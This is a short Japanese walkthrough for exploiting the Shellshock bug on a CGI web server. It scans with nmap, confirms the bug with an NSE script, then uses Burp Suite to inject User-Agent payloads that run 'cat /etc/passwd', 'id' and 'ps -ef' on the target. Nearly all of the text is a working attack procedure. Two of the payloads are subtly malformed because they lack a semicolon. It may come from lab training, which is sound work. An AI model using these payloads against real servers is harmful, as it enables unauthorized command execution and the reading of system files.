Shell Shock
1) pingでターゲットホストが起動しているかどうかを確認する
2) nmapでターゲットホストをポートスキャンする
3) ポート80のopenを確認したら、firefoxでターゲットドメインを検索する
4) 右クリックでページソースを表示する
5) ゲットサーバーでCGIスクリプトが実行されている場合は、nmap nseスクリプトを使用して、サーバーがシェルショック攻撃に対して脆弱かどうかを確認する
nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" ターゲットドメイン
6) もしシェルショックに対して脆弱な場合は、悪意のあるユーザエージェントを作成する必要がある
7) ブラウザの右上にあるFoxyPrixyプラグインアイコンをクリックして、Burp Suiteを起動する
8) Burp Suiteを起動して、プロキシに移動して、インターセプトをONにする
9) ページをリロードして、Burp Suiteを使用してリクエストをインターセプトする
10) 右クリックして、「リピーターに送信」オプションを選択して、リピータータブに移動する
11) そして、User-Agentを変更して悪意のあるペイロードを挿入する
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
12) 送信ボタンを押す。
13) ペイロードを変更して、idコマンドを実行する
() { :; } echo; echo; /bin/bash -c 'id'
14) ペイロードを変更して、ps-efコマンドを実行する
() { :; } echo; echo; /bin/bash -c 'ps -ef'
